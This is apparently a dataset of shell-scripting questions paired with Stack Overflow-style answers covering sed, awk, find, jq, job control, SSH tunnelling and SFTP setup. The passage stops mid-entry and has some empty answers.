    "Can I switch user in Vagrant bootstrap shell script?": "echo '===== Creating PostgreSQL databases and users'\n\nsu postgres << EOF\npsql -c \"\n  create user SomeUserName password '...';\n  alter user ...;\n  \"\nEOF",
    "wait child process but get error: 'pid is not a child of this shell'": "Just find the process id of the process you want to wait for and replace that with 12345 in below script. Further changes can be made as per your requirement.\n#!/bin/sh\nPID=12345\nwhile [ -e /proc/$PID ]\ndo\n    echo \"Process: $PID is still running\" >> /home/parv/waitAndRun.log\n    sleep .6\ndone\necho \"Process $PID has finished\" >> /home/parv/waitAndRun.log\n/usr/bin/waitingScript.sh\nhttp://iamparv.blogspot.in/2013/10/unix-wait-for-running-process-not-child.html",
    "Bash shebang option -l": "The -l option (according to the man page) makes \"bash act as if it had been invoked as a login shell\". Login shells read certain initialization files from your home directory, such as .bash_profile. Since you set the value of TEST in your .bash_profile, the value you set on the command line gets overridden when bash launches.",
    "Is this the right way to run a shell script inside Python?": "OSError: [Errno 8] Exec format error\nThis is an error reported by the operating system when trying to run /home/myuser/go.sh.\nIt looks to me like the shebang (#!) line of go.sh is not valid.\nHere's a sample script that runs from the shell but not from Popen:\n#\\!/bin/sh\necho \"You've just called $0 $@.\"\nRemoving the \\ from the first line fixes the problem.",
    "Define function in unix/linux command line (e.g. BASH)": "Quoting my answer for a similar question on Ask Ubuntu:\nFunctions in bash are essentially named compound commands (or code blocks). From man bash:\nCompound Commands\n   A compound command is one of the following:\n   ...\n   { list; }\n          list  is simply executed in the current shell environment.  list\n          must be terminated with a newline or semicolon.  This  is  known\n          as  a  group  command. \n\n...\nShell Function Definitions\n   A shell function is an object that is called like a simple command  and\n   executes  a  compound  command with a new set of positional parameters.\n   ... [C]ommand is usually a list of commands between { and },  but\n   may  be  any command listed under Compound Commands above.\nThere's no reason given, it's just the syntax.\nTry with a semicolon after wc -l:\nnumresults(){ ls \"$1\"/RealignerTargetCreator | wc -l; }",
    "Alternative to `sed -i` on Solaris": "It isn't exactly the same as sed -i, but i had a similar issue. You can do this using perl:\nperl -pi -e 's/find/replace/g' file\ndoing the copy/move only works for single files. if you want to replace some text across every file in a directory and sub-directories, you need something which does it in place. you can do this with perl and find:\nfind . -exec perl -pi -e 's/find/replace/g' '{}' \\;",
    "Replace value of a line in a yml with bash [duplicate]": "You can use this: sed -r 's/^(\\s*)(image\\s*:\\s*nginx\\s*$)/\\1image: apache/' file\nSample run:\n$ cat file\nweb:\n  image: nginx\n  volumes:\n    - \"./app:/src/app\"\n  ports:\n    - \"3030:3000\"\n    - \"35729:35729\"\n$ sed -r 's/^(\\s*)(image\\s*:\\s*nginx\\s*$)/\\1image: apache/' file\nweb:\n  image: apache\n  volumes:\n    - \"./app:/src/app\"\n  ports:\n    - \"3030:3000\"\n    - \"35729:35729\"\nTo persist the changes into the file you can use in-place option like this:\n$ sed -ri 's/^(\\s*)(image\\s*:\\s*nginx\\s*$)/\\1image: apache/' file\nIf you want it inside a script you can just put the sed command inside a script and execute it with $1 in sustitution.\n$ vim script.sh \n$ cat script.sh \nsed -ri 's/^(\\s*)(image\\s*:\\s*nginx\\s*$)/\\1image: '\"$1\"'/' file\n$ chmod 755 script.sh \n$ cat file \nweb:\n  image: nginx\n  volumes:\n    - \"./app:/src/app\"\n  ports:\n    - \"3030:3000\"\n    - \"35729:35729\"\n$ ./script.sh apache\n$ cat file \nweb:\n  image: apache\n  volumes:\n    - \"./app:/src/app\"\n  ports:\n    - \"3030:3000\"\n    - \"35729:35729\"\n$",
    "File execution with dot space versus dot slash": "Let's start with how the command path works and when it's used. When you run a command like:\nls /tmp\nThe ls here doesn't contain a / character, so the shell searches the directories in your command path (the value of the PATH environment variable) for a file named ls. If it finds one, it executes that file. In the case of ls, it's usually in /bin or /usr/bin, and both of those directories are typically in your path.\nWhen you issue a command with a / in the command word:\n/bin/ls /tmp\nThe shell doesn't search the command path. It looks specifically for the file /bin/ls and executes that.\nRunning ./A is an example of running a command with a / in its name. The shell doesn't search the command path; it looks specifically for the file named ./A and executes that. \".\" is shorthand for your current working directory, so ./A refers to a file that ought to be in your current working directory. If the file exists, it's run like any other command. For example:\ncd /bin\n./ls\nwould work to run /bin/ls.\nRunning . A is an example of sourcing a file. The file being sourced must be a text file containing shell commands. It is executed by the current shell, without starting a new process. The file to be sourced is found in the same way that commands are found. If the name of the file contains a /, then the shell reads the specific file that you named. If the name of the file doesn't contain a /, then the shell looks for it in the command path.\n. A        # Looks for A using the command path, so might source /bin/A for example\n. ./A      # Specifically sources ./A\nSo, your script tries to execute . B and fails claiming that B doesn't exist, even though there's a file named B right there in your current directory. As discussed above, the shell would have searched your command path for B because B didn't contain any / characters. When searching for a command, the shell doesn't automatically search the current directory. It only searches the current directory if that directory is part of the command path.\nIn short, . B is probably failing because you don't have \".\" (current directory) in your command path, and the script which is trying to source B is assuming that \".\" is part of your path. In my opinion, this is a bug in the script. Lots of people run without \".\" in their path, and the script shouldn't depend on that.\nEdit:\nYou say the script uses ksh, while you are using bash. Ksh follows the POSIX standard--actually, KSH was the basis for the POSIX standard--and always searches the command path as I described. Bash has a flag called \"POSIX mode\" which controls how strictly it follows the POSIX standard. When not in POSIX mode--which is how people generally use it--bash will check the current directory for the file to be sourced if it doesn't find the file in the command path.\nIf you were to run bash -posix and run . B within that bash instance, you should find that it won't work.",
    "How to make \"grep\" read patterns from a file?": "grep -v -f pattern_file",
    "Can't execute shell script from python subprocess: permission denied": "Check your run.sh mode, if no executable flag, set it with command\nchmod +x run.sh",
    "Fish shell: how to exit on error (bash set -e)": "There's no equivalent of this in fish. https://github.com/fish-shell/fish-shell/issues/805 spend a little time discussing what a fishy version of this might look like.\nIf the script is short, prefixing each line with and might not be too bad:\ncp file1 file2\nand rm file1\nand echo File moved",
    "How to execute a shell script in PHP?": "",
    "Docker timeout for container?": "You could set up your container with a ulimit on the max CPU time, which will kill the looping process. A malicious user can get around this, though, if they're root inside the container.\nThere's another S.O. question, \"Setting absolute limits on CPU for Docker containers\" that describes how to limit the CPU consumption of containers. This would allow you to reduce the effect of malicious users.\nI agree with Abdullah, though, that you ought to be able to docker kill the runaway from your supervisor.",
    "How to reverse a list of words in a shell string?": "You can use awk as follows:\necho \"$str\" | awk '{ for (i=NF; i>1; i--) printf(\"%s \",$i); print $1; }'",
    "bash - how to remove first 2 lines from output": "You can achieve this with tail:\ntail -n +3 \"$PGLIST\"\n  -n, --lines=K\n          output the last K lines, instead of the last 10; or use -n +K\n          to output starting with the Kth",
    "how to add json object to json file using shell script": "To merge two json objects, you could use jq command-line utility:\n$ jq -s add sample.json another.json\nOutput:\n{\n  \"name\": \"sam\",\n  \"age\": 23,\n  \"designation\": \"doctor\",\n  \"location\": \"canada\"\n}\nTo update a single attribute:\n$ jq '.location=\"canada\"' sample.json\nIt produces the same output.\nTo prepend \"doctor\" to the location:\n$ jq '.location = \"doctor\" + .location' input.json\nOutput:\n{\n  \"name\": \"sam\",\n  \"age\": 23,\n  \"designation\": \"doctor\",\n  \"location\": \"doctorcanada\"\n}",
    "Uploading all of files in my local directory with curl": "Use curl with find to recursively upload all files from a specific directory:\nfind mydir -type f -exec curl -u xxx:psw --ftp-create-dirs -T {} ftp://192.168.1.158/public/demon_test/{} \\;",
    "Concatenate output of two commands into one line": "You could pass the -n option to your first echo command, so it doesn't output a newline.\n\nAs a quick demonstration, this :\necho \"test : \" ; echo \"blah\"\nwill get you :\ntest : \nblah\nWith a newline between the two outputs.\n\nWhile this, with a -n for the first echo :\necho -n \"test : \" ; echo \"blah\"\nwill get you the following output :\ntest : blah\nWithout any newline between the two output.",
    "How to recursively list all files and directories": "How about this:\nfind . -exec ls -dl \\{\\} \\; | awk '{print $3, $4, $9}'",
    "Ctrl-R to search backwards for shell commands in csh": "Try\nbindkey \"^R\" i-search-back",
    "Is it possible to create a script to save and restore permissions?": "The easiest way is to use ACL tools, even if you don't actually use ACLs. Simply call getfacl -R . >saved-permissions to back up the permissions of a directory tree and setfacl --restore=saved-permissions to restore them.\nOtherwise, a way to back up permissions is with find -printf. (GNU find required, but that's what you have on Linux.)\nfind -depth -printf '%m:%u:%g:%p\\0' >saved-permissions\nYou get a file containing records separated by a null character; each record contains the numeric permissions, user name, group name and file name for one file. To restore, loop over the records and call chmod and chown. The -depth option to find is in case you want to make some directories unwritable (you have to handle their contents first).\nYou can restore the permissions with this bash snippet derived from a snippet contributed by Daniel Alder:\nwhile IFS=: read -r -d '' mod user group file; do\n  chown -- \"$user:$group\" \"$file\"\n  chmod \"$mod\" \"$file\"\ndone <saved-permissions\nYou can use the following awk script to turn the find output into some shell code to restore the permissions.\nfind -depth -printf '%m:%u:%g:%p\\0' |\nawk -v RS='\\0' -F: '\nBEGIN {\n    print \"#!/bin/sh\";\n    print \"set -e\";\n    q = \"\\047\";\n}\n{\n    gsub(q, q q \"\\\\\" q);\n    f = $0;\n    sub(/^[^:]*:[^:]*:[^:]*:/, \"\", f);\n    print \"chown --\", q $2 \":\" $3 q, q f q;\n    print \"chmod\", $1, q f q;\n}' > restore-permissions.sh",
    "Shebang and Groovy": "This one #!/usr/bin/env groovy\nwill search your path looking for groovy to execute the script",
    "Shellscript action if two files are different": "if ! cmp -s test.py test.py~\nthen\n  # restart service\nfi\nBreaking that down:\ncmp -s test.py test.py~ returns true (0) if test.py and test.py~ are identical, else false (1). You can see this in man cmp. The -s options makes cmp silent, so it doesn't give any output (except errors), but only an exit code.\n! inverts that result, so the if statement translates to \"if test.py and test.py~ are different\".\nps: If you are not sure the 2nd file exists, you may want check that too. (cmp still works in this case, but gives an error message, suppressing error message may be enough too (cmp ... 2>/dev/null)",
    "Sync MongoDB Via ssh": "You can accomplish this with SSH Tunneling, setting up your remote MongoDB instance to run on one of your local ports. By default, MongoDB runs on 27017, so in the example below, I've chosen to map my remote MongoDB instance to my local 27018 port.\nIf on your trying to copy a database from SERVER1 to LOCALHOST, you could run this command on your LOCALHOST:\nssh -L27018:localhost:27017 SERVER1\n(Obviously replace SERVER1 with your actual server or ssh alias)\nThis opens an SSH connection to SERVER1, but also maps the port 27018 on LOCALHOST to the remote port 27017 on SERVER1. Don't close that SSH connection, and now try to connect to MongoDB on your localhost machine with port 27018, like so:\nmongo --port 27018\nYou'll notice this is now the data on SERVER1, except you're accessing it from your local machine.\nJust running MongoDB normally:\nmongo (or mongo --port 27107)\nWill be your local machine.\nNow, since you technically have (on your LOCALHOST, where you ran the SSH tunnel):\nMongoDB (LOCALHOST) on 27017\nMongoDB (SERVER1) on 27018\nYou can just use the db.copyDatabase() function inside MongoDB (LOCALHOST) to copy over data.\nFROM LOCALHOST ON PORT 27017 (Executing on live will DROP YOUR DATA)\n// Use the right DB\nuse DATABASENAME; \n// Drop the Existing Data on LOCALHOST\ndb.dropDatabase();\n// Copies the entire database from 27018\ndb.copyDatabase(\"DATABASENAME\", \"DATABASENAME\", \"localhost:27018\");\nYou should be able to wrap this all up into a shell script that can execute all of these commands for you. I have one myself, but it actually has a few extra steps that would probably make it a bit more confusing :)\nDoing this, and using MongoDB's native db.copyDatabase() function will prevent you from having to dump/zip/restore. Of course, if you still want to go that route, it wouldn't be too hard to run mongodump, export the data, tar/gzip it, then use scp TARGETSERVER:/path/to/file /local/path/to/file to pull it down and run a mongorestore on it.\nJust seems like more work!\nEdit - Here's a SH and JS file that go together to make a shell script you can run this with. Run these on your LOCALHOST, don't run them on live or it'll do the db.dropDatabase on live. Put these two files in the same folder, and replace YOURSERVERNAME in pull-db.sh with the domain/ip/ssh alias, and then in pull-db.js change DBNAMEHERE to whatever your database name is.\nI normally create a folder called scripts in my projects, and using Textmate, I just have to hit \u2318+R while having pull-db.sh open to edit in order to execute it.\npull-db.sh\nssh -L27018:localhost:27017 YOURSERVERNAME '\n    echo \"Connected on Remote End, sleeping for 10\"; \n    sleep 10; \n    exit' &\necho \"Waiting 5 sec on local\";\nsleep 5;\necho \"Connecting to Mongo and piping in script\";\ncat pull-db.js | mongo\npull-db.js\nuse DBNAMEHERE;\ndb.dropDatabase();\nuse DBNAMEHERE;\ndb.copyDatabase(\"DBNAMEHERE\",\"DBNAMEHERE\",\"localhost:27018\");\nI added some extra code to the shell script to echo out what it's doing (sorta). The sleep timers in the script are just to give the SSH connections time to get connected before the next line is run. Basically, here's what happens:\nFirst line of the code creates the tunnel on your machine, and sends the ECHO, SLEEP, then EXIT to the remote SSH session.\nIt then waits 5 seconds, which allows the SSH session in step 1 to connect.\nThen we pipe the pull-db.js file into the local mongo shell. (Step #1 should be done within 5 sec...)\nThe pull-db.js should be running in mongo now, and the SSH terminal in Step #1 has probably run for 10 seconds after it's connection opened, and the EXIT is sent to it's session. The command is issued, HOWEVER, the SSH session will actually stay open until the activity from Step #3 is complete.\nAs soon as your pull-db.js script finishes pulling all of your data from the remote server, the EXIT command issued in Step #1 on the remote server is finally allowed to close the connection, unbinding 27108 on your localhost.\nYou should now have all of the data from your remote database in your localhost.",
    "How do I compare file names in two directories in shell script?": "Files that are in both Dir1 and Dir2:\nfind \"$Dir1/\" \"$Dir2/\" -printf '%P\\n' | sort | uniq -d\nFiles that are in Dir1 but not in Dir2:\nfind \"$Dir1/\" \"$Dir2/\" \"$Dir2/\" -printf '%P\\n' | sort | uniq -u\nFiles that are in Dir2 but not in Dir1:\nfind \"$Dir1/\" \"$Dir1/\" \"$Dir2/\" -printf '%P\\n' | sort | uniq -u",
    "Call a function using nohup": "Another solution:\nfunction background {\n    echo TEST\n}\nexport -f background \n\nnohup bash -c background &",
    "How to add double quotes to a line with SED or AWK?": "Use this to pipe your input into:\nsed 's/^/\"/;s/$/\"/'\n^ is the anchor for line start and $ the anchor for line end. With the sed line we're replacing the line start and the line end with \" and \" respectively.\nExample:\n$ echo -e \"name,id,2\\nname,id,3\\nname,id,4\"|sed 's/^/\"/;s/$/\"/'\n\"name,id,2\"\n\"name,id,3\"\n\"name,id,4\"\nwithout the sed:\n$ echo -e \"name,id,2\\nname,id,3\\nname,id,4\"\nname,id,2\nname,id,3\nname,id,4\nYour file seems to have DOS line endings. Pipe it through dos2unix first.\nProof:\n$ cat test.txt\nname,id,2\nname,id,3\nname,id,4\n$ sed 's/^/\"/;s/$/\"/' test.txt\n\"name,id,2\n\"name,id,3\n\"name,id,4\n$ cat test.txt|dos2unix|sed 's/^/\"/;s/$/\"/'\n\"name,id,2\"\n\"name,id,3\"\n\"name,id,4\"",
    "Does linux kill background processes if we close the terminal from which it has started?": "Who should kill jobs?\nNormally, foreground and background jobs are killed by SIGHUP sent by kernel or shell in different circumstances.\nWhen does kernel send SIGHUP?\nKernel sends SIGHUP to controlling process:\nfor real (hardware) terminal: when disconnect is detected in a terminal driver, e.g. on hang-up on modem line;\nfor pseudoterminal (pty): when last descriptor referencing master side of pty is closed, e.g. when you close terminal window.\nKernel sends SIGHUP to other process groups:\nto foreground process group, when controlling process terminates;\nto orphaned process group, when it becomes orphaned and it has stopped members.\nControlling process is the session leader that established the connection to the controlling terminal.\nTypically, the controlling process is your shell. So, to sum up:\nkernel sends SIGHUP to the shell when real or pseudoterminal is disconnected/closed;\nkernel sends SIGHUP to foreground process group when the shell terminates;\nkernel sends SIGHUP to orphaned process group if it contains stopped processes.\nNote that kernel does not send SIGHUP to background process group if it contains no stopped processes.\nWhen does bash send SIGHUP?\nBash sends SIGHUP to all jobs (foreground and background):\nwhen it receives SIGHUP, and it is an interactive shell (and job control support is enabled at compile-time);\nwhen it exits, it is an interactive login shell, and huponexit option is set (and job control support is enabled at compile-time).\nSee more details here.\nNotes:\nbash does not send SIGHUP to jobs removed from job list using disown;\nprocesses started using nohup ignore SIGHUP.\nMore details here.\nWhat about other shells?\nUsually, shells propagate SIGHUP. Generating SIGHUP at normal exit is less common.\nTelnet or SSH\nUnder telnet or SSH, the following should happen when connection is closed (e.g. when you close telnet window on PC):\nclient is killed;\nserver detects that client connection is closed;\nserver closes master side of pty;\nkernel detects that master pty is closed and sends SIGHUP to bash;\nbash receives SIGHUP, sends SIGHUP to all jobs and terminates;\neach job receives SIGHUP and terminates.\nProblem\nI can reproduce your issue using bash and telnetd from busybox or dropbear SSH server: sometimes, background job doesn't receive SIGHUP (and doesn't terminate) when client connection is closed.\nIt seems that a race condition occurs when server (telnetd or dropbear) closes master side of pty:\nnormally, bash receives SIGHUP and immediately kills background jobs (as expected) and terminates;\nbut sometimes, bash detects EOF on slave side of pty before handling SIGHUP.\nWhen bash detects EOF, it by default terminates immediately without sending SIGHUP. And background job remains running!\nSolution\nIt is possible to configure bash to send SIGHUP on normal exit (including EOF) too:\nEnsure that bash is started as login shell. The huponexit works only for login shells, AFAIK.\nLogin shell is enabled by -l option or leading hyphen in argv[0]. You can configure telnetd to run /bin/bash -l or better /bin/login which invokes /bin/sh in login shell mode.\nE.g.:\ntelnetd -l /bin/login\nEnable huponexit option.\nE.g.:\nshopt -s huponexit\nType this in bash session every time or add it to .bashrc or /etc/profile.\nWhy does the race occur?\nbash unblocks signals only when it's safe, and blocks them when some code section can't be safely interrupted by a signal handler.\nSuch critical sections invoke interruption points from time to time, and if signal is received when a critical section is executed, it's handler is delayed until next interruption point happens or critical section is exited.\nYou can start digging from quit.h in the source code.\nThus, it seems that in our case bash sometimes receives SIGHUP when it's in a critical section. SIGHUP handler execution is delayed, and bash reads EOF and terminates before exiting critical section or calling next interruption point.\nReference\n\"Job Control\" section in official Glibc manual.\nChapter 34 \"Process Groups, Sessions, and Job Control\" of \"The Linux Programming Interface\" book.",
    "modifying a Plist from command line on Mac using Defaults": "XML property lists can be viewed in a text editor directly as Lauri's answer above suggests.\nBinary property lists (found in many of Apple's own shipping applications) need to be converted to an XML property list format first.\nplutil may be used to do this, in either direction. Take care though as the property list is modified in place, so you make wish to make a copy of the property list first.\nplutil -convert xml1 binary-property-list-to-convert.plist\nAnd to convert it back to binary:\nplutil -convert binary1 XML-property-list-to-convert.plist",
    "sass watching multiple directories": "I'm hoping you've already tried it, but you can just add all folders into one command line:\nsass --watch path/to/sass1:path/to/css1 path/to/sass2:path/to/css2 path/to/sass3:path/to/css3",
    "How to kill a running python process? [duplicate]": "The pkill utility can look at command lines when sending signals:\npkill -f xxx.py",
    "How do you parse a filename in bash?": "You can use the cut command to get at each of the 3 'fields', e.g.:\n$ echo \"system-source-yyyymmdd.dat\" | cut -d'-' -f2\nsource\n\"-d\" specifies the delimiter, \"-f\" specifies the number of the field you require",
    "Syntax error near unexpected token `elif'": "It's your line endings. Transferring it from Windows has left the CR/LF line endings on.\nWhen I create a script then manually add the CR characters, I get exactly the same error:\nqq.sh: line 3: syntax error near unexpected token `elif'\n'q.sh: line 3: `elif [ 1 == 1 ] ; then\nYou can fix it by removing the CR character from CR/LF line endings.\ncat script.sh | sed 's/\\r$//' >newscript.sh",
    "How to get the exit code of spawned process in expect shell script?": "You get the exit status of the spawned process with the wait command:\nexpect <<'END'\nlog_user 0\nspawn sh -c {echo hello; exit 42}\nexpect eof\nputs $expect_out(buffer)\n\nlassign [wait] pid spawnid os_error_flag value\n\nif {$os_error_flag == 0} {\n    puts \"exit status: $value\"\n} else {\n    puts \"errno: $value\"\n}\nEND\nhello\n\nexit status: 42\nFrom the expect man page\nwait [args]\ndelays until a spawned process (or the current process if none is named) terminates.\nwait normally returns a list of four integers. The first integer is the pid of the process that was waited upon. The second integer is the corresponding spawn id. The third integer is -1 if an operating system error occurred, or 0 otherwise. If the third integer was 0, the fourth integer is the status returned by the spawned process. If the third integer was -1, the fourth integer is the value of errno set by the operating system. The global variable errorCode is also set.\nChange\nexpect {\n\"INVALID \"  { exit 4 }\ntimeout     { exit 4 }\n}\nto\nexpect {\n    \"INVALID \"  { exit 4 }\n    timeout     { exit 4 }\n    eof\n}\nThen add the lassign and if commands.",
    "How do I tell what type my shell is": "This is what I use in my .profile:\n# .profile is sourced at login by sh and ksh. The zsh sources .zshrc and\n# bash sources .bashrc. To get the same behaviour from zsh and bash as well\n# I suggest \"cd; ln -s .profile .zshrc; ln -s .profile .bashrc\".\n# Determine what (Bourne compatible) shell we are running under. Put the result\n# in $PROFILE_SHELL (not $SHELL) so further code can depend on the shell type.\n\nif test -n \"$ZSH_VERSION\"; then\n  PROFILE_SHELL=zsh\nelif test -n \"$BASH_VERSION\"; then\n  PROFILE_SHELL=bash\nelif test -n \"$KSH_VERSION\"; then\n  PROFILE_SHELL=ksh\nelif test -n \"$FCEDIT\"; then\n  PROFILE_SHELL=ksh\nelif test -n \"$PS3\"; then\n  PROFILE_SHELL=unknown\nelse\n  PROFILE_SHELL=sh\nfi\nIt does not make fine distinctions between ksh88, ksh95, pdksh or mksh etc., but in more than ten years it has proven to work for me as designed on all the systems I were at home on (BSD, SunOS, Solaris, Linux, Unicos, HP-UX, AIX, IRIX, MicroStation, Cygwin.)\nI don't see the need to check for csh in .profile, as csh sources other files at startup. Any script you write does not need to check for csh vs Bourne-heritage because you explicitly name the interpreter in the shebang line.",
    "How to assign an output to a shellscript variable?": "You're looking for the shell feature called command-substitution.\nThere are 2 forms of cmd substitution\nOriginal, back to the stone-age, but completely portable and available in all Unix-like shells (well almost all).\nYou enclose your value generating commands inside of the back-ticks characters, i.e.\n$ a=`echo 1+1 | bc -l`\n$ echo $a\n2\n$\nModern, less clunky looking, easily nestable cmd-substitution supplied with $( cmd ), i.e.\n$ a=$(echo 1+1 |  bc -l)\n$ echo $a\n2\n$\nYour 'she-bang' line says, #!/bin/sh, so if you're running on a real Unix platform, then it's likely your /bin/sh is the original Bourne shell, and will require that you use option 1 above.\nIf you try option 2 while still using #!/bin/sh and it works, then you have modern shell. Try typing echo ${.sh.version} or /bin/sh -c --version and see if you get any useful information. If you get a version number, then you'll want to learn about the extra features that newer shells contain.\nSpeaking of newer features, if you are really using bash, zsh, ksh93+, then you can rewrite your sample code as\na=$(( 1+1 ))\nOr if you're doing more math operations, that would all stay inside the scope, you can use shell feature arithmetic like:\n(( b=1+1 ))\necho $b\n2\nIn either case, you can avoid extra process creation, but you can't do floating point arithmetic in the shell (whereas you can with bc).",
    "Sort by number of occurrences": "some_command | sort | uniq -c | sort -n",
    "How to display /proc/meminfo in Megabytes?": "This will convert any kB lines to MB:\nawk '$3==\"kB\"{$2=$2/1024;$3=\"MB\"} 1' /proc/meminfo | column -t\nThis version converts to gigabytes:\nawk '$3==\"kB\"{$2=$2/1024^2;$3=\"GB\";} 1' /proc/meminfo | column -t\nFor completeness, this will convert to MB or GB as appropriate:\nawk '$3==\"kB\"{if ($2>1024^2){$2=$2/1024^2;$3=\"GB\";} else if ($2>1024){$2=$2/1024;$3=\"MB\";}} 1' /proc/meminfo | column -t",
    "How to invoke bash or shell scripts from a haskell program?": "You can use System.Process. For example, executing seq 1 10 shell command:\n> import System.Process\n\n> readProcess \"seq\" [\"1\", \"10\"] \"\"\n\"1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n\"\nit :: String\n\n> readProcessWithExitCode  \"seq\" [\"1\", \"10\"] \"\"\n(ExitSuccess,\"1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n\",\"\")\nit :: (GHC.IO.Exception.ExitCode, String, String)",
    "*export* all variables from key=value file to shell": "Run set -a before sourcing the file. This marks all new and modified variables that follow for export automatically.\nset -a\nsource site.conf\nset +a  # Require export again, if desired.\nThe problem you observed is that the pipe executes the export in a subshell. You can avoid that simply by using input redirection instead of a pipe.\nwhile read assignment; do\n  export \"$assignment\"\ndone < site.conf\nThis won't work, however, if (unlikely though it is) you have multiple assignments on one line, such as\nEMAIL=\"dev@example.com\" FULLNAME=\"Master Yedi\" ",
    "Checking if PWD contains directory name": "You can use BASH regex for this:\n[[ \"$PWD\" =~ somedir ]] && echo \"PWD has somedir\"\nOR using shell glob:\n[[ \"$PWD\" == *somedir* ]] && echo \"PWD has somedir\"",
    "How can I make the \"du\" command run without outputting all the directories, like quiet mode?": "Use the option -s (summarize):\ndu -sh folder\n(-h is used to make the output human readable, meaning converting the number of bytes into KB,MB,GB .. )",
    "Write output of `npm run start` to a file": "This will work\nnpm run start 2>&1| tee npm.txt\nExplanation:\n2>&1 will redirect error stderr to stdout and tee command will write terminal output to file.",
    "How to use source command within Jenkins pipeline script": "",
    "What is the difference between Shell, Kernel and API": "A command-line interface (CLI) shell is a command interpreter, i.e. the program that either processes the command you enter in your command line (aka terminal) or processes shell scripts (text files containing commands) (batch mode). In early Unix times, it used to be the unique way for users to interact with their machines. Nowadays, graphical user interfaces (GUIs) are becoming the preferred type of shell for most users.\nA kernel is a low level program interfacing with the hardware (CPU, RAM, disks, network, ...) on top of which applications are running. It is the lowest level program running on computers although with virtualization you can have multiple kernels running on top of virtual machines which themselves run on top of another operating system.\nAn API is a generic term defining the interface developers have to use when writing code using libraries and a programming language. Kernels have no APIs as they are not libraries. They do have an ABI, which, beyond other things, define how do applications interact with them through system calls. Unix application developers use the standard C library (eg: libc, glibc) to build ABI compliant binaries. printf(3) and fopen(3) are not wrappers to system calls but (g)libc standard facilities. The low level system calls they eventually use are write(2) and open(2) and possibly others like brk, mmap. The number in parentheses is a convention to tell in what manual the command is to be found.\nThe first volume of the Unix manual pages contains the shell commands.\nThe second one contains the system call wrappers like write and open. They form the interface to the kernel.\nThe third one contains the standard library (including the Unix standard API) functions (excluding system calls) like fopen and printf. These are not wrappers to specific system calls but just code using system calls when required.",
    "Clean way of launching a shell script in background from Jenkins": "",
    "How to get the first column of comm output?": "\"So I'm trying to get the first column of comm output\"\nThe first column of the \"comm file1 file2\" output contains lines unique to the file1. You can skip the post-processing by simply calling comm with -2 (suppress lines unique to file2) and -3 (suppress lines that appear in both files).\ncomm -2 -3 file1 file2   # will show only lines unique to file1\nHowever, if you have no choice but to process a pre-run output of comm then as Carl mentioned, cut would be an option:\ncut -f1 comm-results.txt\nHowever, this result in empty lines for cases where column 1 is empty. To deal with this, perhaps awk may be more suitable:\nawk -F\"\\t\" '{if ($1) print $1}' comm-results.txt\n     ----    ----------------\n      |                     |\n   Use tab as delimiter     |\n                            +-- only print if not empty",
    "wc -l is NOT counting last of the file if it does not have end of line character": "grep -c returns the number of matching lines. Just use an empty string \"\" as your matching expression:\n$ echo -n $'a\\nb\\nc' > 2or3.txt\n$ cat 2or3.txt | wc -l\n2\n$ grep -c \"\" 2or3.txt\n3",
    "Grep lines for numbers greater than given number": "try this:\nstat -c '%a %n' *|awk '$1>755'\nif you just want the filename in your final output, skip the privilege numbers, you could:\nstat -c '%a %n' *|awk '$1>755{print $2}'\nEDIT\nactually you could do the chmod within awk. but you should make sure the user execute the awk line has the permission to change those files.\nstat -c '%a %n' *|awk '$1>755{system(\"chmod 755 \"$2)}'\nagain, assume the filename has no spaces.",
    "How to zip files without the top level folder but keep the sub folders": "cd abc\nzip -r ../abc.zip *\nThough I will say in most cases keeping it abc makes for easier management.",
    "Suppress \"nothing to be done for 'all' \"": "You can make \"all\" a PHONY target (if it isn't already) which has the real target as a prerequisite, and does something inconspicuous:\n.PHONY: all\n\nall: realTarget\n    @echo > /dev/null",
    "Create a SFTP user to access only one directory. [closed]": "I prefer to create a user group sftp and restrict users in that group to their home directory.\nFirst, edit your /etc/ssh/sshd_config file and add this at the bottom.\nMatch Group sftp\n    ChrootDirectory %h\n    ForceCommand internal-sftp\n    AllowTcpForwarding no  \nThis tells OpenSSH that all users in the sftp group are to be chrooted to their home directory (which %h represents in the ChrootDirectory command)\nAdd a new sftp group, add your user to the group, restrict him from ssh access and define his home directory.\ngroupadd sftp\nusermod username -g sftp\nusermod username -s /bin/false\nusermod username -d /home/username\nRestart ssh:\nsudo service ssh restart\nIf you are still experiencing problems, check that the directory permissions are correct on the home directory. Adjust the 755 value appropriately for your setup.\nsudo chmod 755 /home/username\nEDIT: Based on the details of your question, it looks like you are just missing the sshd_config portion. In your case, substitute sftp with sftpexport. Also be sure that the file permissions are accessible on the /u02/export/cdrs directory.\nAn even better setup (and there are even better setups than what I am about to propose) is to symlink the /u02/export/cdrs directory to the user home directory.",
    "Why would I create an alias which creates a function?": "Here are my 2 cents on this and it represents my personal opinion as well as understanding on the topic.\nUsing aliases with functions is to some extent a personal preference of developers. I will add some differences between the two approaches, which may also account for personal preferences of using aliases vs functions\nThere are times when most of the things I want to do are possible with aliases itself but only a few require to take a parameter. So instead of mixing aliases with functions, I use an alias with the function itself\nExample:\nalias kgps='kubectl get pods --all-namespaces | grep '\nThis works great and I can search my kubernetes pods. Now for deleting these pods, I need to pass the same parameter but in between the command, so I use an alias with a function inside\nalias kdp=\"_(){ kubectl get pods --all-namespaces  | grep \\$1 | awk '{print \\$2}' | xargs kubectl delete pod; }; _\"\nSo most of my shortcut commands are possible to execute through aliases and only few which needs such things I use aliases with functions.\nAliases vs Functions\nNow there are few differences between aliases and functions which I would like to highlight\nAliases can override system commands much more easily compared to functions\nIf I need to override ls, I can do that much easier with alias\nalias ls='ls -altrh'\nWhile a function equivalent of the same would be like below\nls() { command ls -altrh \"$@\";}\nls() { /bin/ls -altrh \"$@\";}\nAliases intention is mostly for shortcuts\nAliases are majorly used to create shortcut commands while functions are used for a lot of things, complex combinations of commands, auto-completion, bash prompts\nAliases are easier to manage\nRun alias command you get a list of currently active aliases\n$ alias\n....\nvs='vagrant ssh'\nvu='vagrant up'\nvus='vu && vs'\n....\nTo get the list of functions we need to use declare -f or another similar command\n$ declare -f | wc -l\n  8226\n$ alias | wc -l\n  217\nNow if I post a partial output of declare -f I get\n$ declare -f\n...\nvi_mode_prompt_info () {\n    return 1\n}\nvirtualenv_prompt_info () {\n    return 1\n}\nwork_in_progress () {\n    if $(git log -n 1 2>/dev/null | grep -q -c \"\\-\\-wip\\-\\-\")\n    then\n        echo \"WIP!!\"\n    fi\n}\nzle-line-finish () {\n    echoti rmkx\n}\nzle-line-init () {\n    echoti smkx\n}\nzsh_stats () {\n    fc 